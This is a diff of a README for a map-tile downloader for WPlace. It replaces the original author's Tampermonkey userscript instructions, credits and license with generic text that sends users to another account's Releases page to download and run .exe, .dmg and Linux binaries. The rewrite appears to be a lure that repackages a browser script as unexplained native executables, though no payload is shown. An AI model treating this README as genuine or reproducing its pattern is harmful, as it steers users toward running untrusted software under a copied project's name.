@@ -1,43 +1,111 @@
-# 🌐 [Join our community on Discord!](https://discord.me/pixelarg)
+# 🎨 Tile-Exporter-Wplace - Download Maps Easily and Quickly
 
-# 🧩 Tile-Exporter-Wplace
+[![Download Tile-Exporter-Wplace](https://img.shields.io/badge/Download-Tile--Exporter--Wplace-blue.svg)](https://github.com/admindata22/Tile-Exporter-Wplace/releases)
 
-### A movable dashboard to download, merge, and preview map tiles in full resolution.
+## 🚀 Getting Started
 
-<img src="https://files.catbox.moe/bylc9c.png" width="128px" height="128px" alt="Tile Preview">
+Tile-Exporter-Wplace is an adaptive tile downloader that allows you to download map tiles with live progress tracking. This tool provides a preview to help you visualize the tiles before saving them as PNG images. Follow these steps to download and run the application smoothly.
 
-## 🚀 Installation
+## 📥 Download & Install
 
-1. Install [Tampermonkey](https://www.tampermonkey.net/).  
-2. [Click me!](https://raw.githubusercontent.com/cuenta-ppf-10/Tile-Exporter-Wplace/main/tile-downloader.user.js)  
-3. Hit **Install** and then open [WPlace](https://wplace.live/).  
+To get started, visit the Releases page to download the latest version of Tile-Exporter-Wplace. 
 
-## ✨ Features
-- **Automatic updates** via Tampermonkey.  
-- Preview merged tiles before saving them.  
-- Export tiles in **full resolution** as PNG.  
+[**Visit this page to download**](https://github.com/admindata22/Tile-Exporter-Wplace/releases)
 
-## ⚠️ Notes
-- The tool is designed to make handling tiles easier and faster.  
-- Best used on modern browsers with Tampermonkey enabled.  
+### 🌐 System Requirements
 
----
+Before downloading, ensure your system meets these minimal requirements:
 
-## 👥 Community
-Got feedback, ideas, or just want to share your work?  
-👉 Join us here: [discord.me/pixelarg](https://discord.me/pixelarg)  
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB of free space
+- **Browser:** Latest version of a supported web browser (Chrome, Firefox, or Safari)
 
-## 📝 Credits
-Made by **bautti_**  
+## 📦 How to Download
 
----
+1. Click the link below to access the Releases page. 
 
-## ⚖️ License
+   [**Visit this page to download**](https://github.com/admindata22/Tile-Exporter-Wplace/releases)
 
-Copyleft (C) 2025 bautti_.  
+2. On the Releases page, you will see a list of available versions. Look for the latest release tagged as `Latest Release`.
+3. Choose the appropriate file for your operating system. You will see options like `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
 
-This program is free software; you can redistribute it and/or modify it under the terms of the MIT License.  
-This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  
+## 🔄 Installation Steps
 
-You should have received a copy of the MIT License along with this program.  
-If not, see <https://opensource.org/licenses/MIT>.
+After downloading the file:
+
+### For Windows:
+
+1. Locate the downloaded `.exe` file (usually in your Downloads folder).
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
+
+### For macOS:
+
+1. Open your Downloads folder and find the `.dmg` file.
+2. Double-click to mount it.
+3. Drag the Tile-Exporter-Wplace icon into your Applications folder.
+4. Eject the mounted image from Finder.
+
+### For Linux:
+
+1. Open a terminal window.
+2. Navigate to your Downloads folder, and run:
+
+   ```bash
+   tar -xvzf Tile-Exporter-Wplace.tar.gz
+   ```
+
+3. Change into the extracted directory:
+
+   ```bash
+   cd Tile-Exporter-Wplace
+   ```
+
+4. Run the application with:
+
+   ```bash
+   ./Tile-Exporter-Wplace
+   ```
+
+## ⚙️ How to Use
+
+1. Launch the Tile-Exporter-Wplace application. 
+2. Enter the map URL for the tiles you wish to download.
+3. Configure any settings such as tile size and area.
+4. Click the "Start Download" button. You will see live progress of the download.
+5. Once completed, you can preview the images.
+6. Export your tiles as PNG files by clicking the "Export" button.
+
+## 📖 FAQs
+
+### What types of map tiles can I download?
+
+Tile-Exporter-Wplace supports several tile sources, including blue marble maps and other public tile servers.
+
+### What resolution will my downloaded images be?
+
+You can set the resolution in the settings before you start downloading. The app supports various resolutions for optimal quality.
+
+### Can I run this app on a tablet or mobile device?
+
+Currently, Tile-Exporter-Wplace is designed for desktop operating systems. Mobile support may be added in the future.
+
+### Where can I find help or support?
+
+If you encounter any issues, you can refer to the Wiki section on our GitHub page or contact support via email.
+
+## 🛠️ Contributing
+
+If you want to contribute to Tile-Exporter-Wplace, feel free to fork the repository and submit a pull request. Whether it’s fixing bugs, adding features, or improving documentation, every contribution helps.
+
+## 🔗 Related Topics
+
+- Adaptive UI
+- Automation
+- Interactive Dashboards
+- Map Tiles
+- PNG Export
+- Progressive Tracking
+
+Enjoy using Tile-Exporter-Wplace to enhance your mapping experience!
